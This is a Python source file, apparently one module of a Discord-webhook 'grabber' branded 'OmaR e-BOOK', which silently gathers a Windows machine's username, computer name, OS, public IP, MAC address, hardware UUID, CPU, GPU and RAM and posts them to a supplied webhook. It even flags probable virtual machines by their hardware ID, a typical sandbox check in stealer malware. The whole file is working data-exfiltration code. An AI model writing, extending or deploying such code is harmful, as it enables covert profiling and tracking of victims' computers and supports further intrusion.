import os
import psutil
import subprocess 
import requests

class PcInfo:
    def __init__(omar, webhook):
        omar.get_inf(webhook)

    def get_inf(omar, webhook):
        win = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        graphic_card = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
        users = os.getenv("UserName")
        hs = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        data = {
            "embeds": [
                {
                    "title": "xii5 OmaR",
                    "color": 8388736,
                    "fields": [
                        {
                            "name": "System Info",
                            "value": f'''<a:ban:848236721971134475> **PC Username:** `{users}`\n:desktop: **PC Name:** `{hs}`\n\n<:windows:791692679419265044> **OS:** `{win}`\n\n<a:pipenv:639527395027582996> **IP:** `{ip}`\n<a:pipenv:639527395027582996> **MAC:** `{mac}`\n<a:bluestar:957242848946839552> **HWID if `0000` Its Most Likely a VM:** `{hwid}`\n\n<a:pipenv:639527395027582996> **CPU:** `{cpu}`\n<a:pipenv:639527395027582996> **GPU:** `{graphic_card}`\n<a:pipenv:639527395027582996> **RAM:** `{ram}GB`'''
                        }
                    ],
                    "footer": {
                        "text": "OmaR e-BOOK Created By xii5"
                    },
                    "thumbnail": {
                        "url": "https://i.imgur.com/YJWAFoX.gif"
                    }
                }
            ],
            "username": "OmaR e-BOOK",
            "avatar_url": "https://i.imgur.com/dgnrMFo.gif"
        }

        requests.post(webhook, json=data)
